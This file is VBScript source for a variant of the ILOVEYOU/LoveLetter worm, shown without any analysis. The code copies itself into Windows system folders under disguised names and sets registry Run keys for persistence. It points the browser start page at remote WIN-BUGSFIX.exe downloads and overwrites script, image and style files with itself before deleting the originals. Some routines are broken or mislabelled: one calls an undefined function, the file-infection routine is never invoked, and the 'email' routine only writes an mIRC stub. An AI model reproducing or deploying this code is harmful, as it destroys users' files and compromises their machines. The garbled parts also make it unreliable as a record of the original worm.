On Error Resume Next

Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq = ""
ctr = 0

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
vbscopy = file.ReadAll

main()

Sub main()
    On Error Resume Next
    Dim wscr, rr

    Set wscr = CreateObject("WScript.Shell")
    rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")

    If (rr >= 1) Then
        wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
    End If

    Set dirwin = fso.GetSpecialFolder(0)
    Set dirsystem = fso.GetSpecialFolder(1)
    Set dirtemp = fso.GetSpecialFolder(2)
    Set c = fso.GetFile(WScript.ScriptFullName)

    c.Copy(dirsystem & "\MSKernel32.vbs")
    c.Copy(dirwin & "\Win32DLL.vbs")
    c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")

    regruns()
    html()
    spreadtoemail()
    listadriv()
End Sub

Sub regruns()
    On Error Resume Next
    Dim num, downread

    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"

    downread = ""
    downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

    If (downread = "") Then
        downread = "c:\"
    End If

    If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
        Randomize

        num = Int((4 * Rnd) + 1)

        If num = 1 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
        ElseIf num = 2 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
        ElseIf num = 3 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
        ElseIf num = 4 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
        End If
    End If

    If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
        regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
    End If
End Sub

Sub listadriv()
    On Error Resume Next
    Dim d, dc, s

    Set dc = fso.Drives

    For Each d In dc
        If (d.DriveType = 2) Or (d.DriveType = 3) Then
            folderlist(d.path & "\")
        End If
    Next

    listadriv = s
End Sub

Sub infectfiles(folderspec)
    On Error Resume Next
    Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3

    Set f = fso.GetFolder(folderspec)
    Set fc = f.Files

    For Each f1 In fc
        ext = fso.GetExtensionName(f1.path)
        ext = LCase(ext)
        s = LCase(f1.name)

        If (ext = "vbs") Or (ext = "vbe") Then
            Set ap = fso.OpenTextFile(f1.path, 2, True)
            ap.Write vbscopy
            ap.Close
        ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
            Set ap = fso.OpenTextFile(f1.path, 2, True)
            ap.Write vbscopy
            ap.Close
            bname = fso.GetBaseName(f1.path)
            Set cop = fso.GetFile(f1.path)
            cop.Copy(folderspec & "\" & bname & ".vbs")
            fso.DeleteFile(f1.path)
        ElseIf (ext = "jpg") Or (ext = "jpeg") Then
            Set ap = fso.OpenTextFile(f1.path, 2, True)
            ap.Write vbscopy
            ap.Close
            Set cop = fso.GetFile(f1.path)
            cop.Copy(f1.path & ".vbs")
            fso.DeleteFile(f1.path)
        ElseIf (ext = "mp3") Or (ext = "mp2") Then
            Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
            mp3.Write vbscopy
            mp3.Close
            Set att = fso.GetFile(f1.path)
            att.Attributes = att.Attributes + 2
        End If
    Next

    Set fc = f.SubFolders

    For Each f1 In fc
        infectfiles(f1.path)
    Next
End Sub

Function fileexist(filespec)
    On Error Resume Next
    Dim f

    fileexist = 0
    Set f = fso.GetFile(filespec)

    If (Err.Number = 0) Then
        fileexist = 1
    End If
End Function

Function randomstring(length)
    On Error Resume Next
    Dim s, i

    s = ""
    For i = 1 To length
        Randomize
        s = s & Chr(Int((90 - 65 + 1) * Rnd + 65))
    Next

    randomstring = s
End Function

Sub regcreate(regname, regvalue)
    On Error Resume Next
    Dim wscr

    Set wscr = CreateObject("WScript.Shell")
    wscr.RegWrite regname, regvalue
End Sub

Function regget(regname)
    On Error Resume Next
    Dim wscr

    Set wscr = CreateObject("WScript.Shell")
    regget = wscr.RegRead(regname)
End Function

Sub html()
    On Error Resume Next
    Dim h, t, s

    t = "<html><head><title>Asal moe</title>"
    t = t & "<script language='JavaScript'>"
    t = t & "window.location = 'http://www.skyinet.net/~dutch/frenchscandal1.htm';"
    t = t & "</script></head><body></body></html>"

    Set h = fso.CreateTextFile(dirtemp & "\DUTCH.html", True)
    h.Write t
    h.Close
End Sub

Sub spreadtoemail()
    On Error Resume Next
    Dim f, f1, fc, ext, t

    Set f = fso.GetFolder(dirsystem)
    Set fc = f.Files

    For Each f1 In fc
        ext = fso.GetExtensionName(f1.path)
        ext = LCase(ext)

        If (ext = "mrc") Then
            Set t = fso.OpenTextFile(f1.path, 1, True)
            t.WriteLine "on *:OPEN:?: {"
            t.WriteLine "  .timerLASTPING 0"
            t.WriteLine "}"
            t.Close
        End If
    Next
End Sub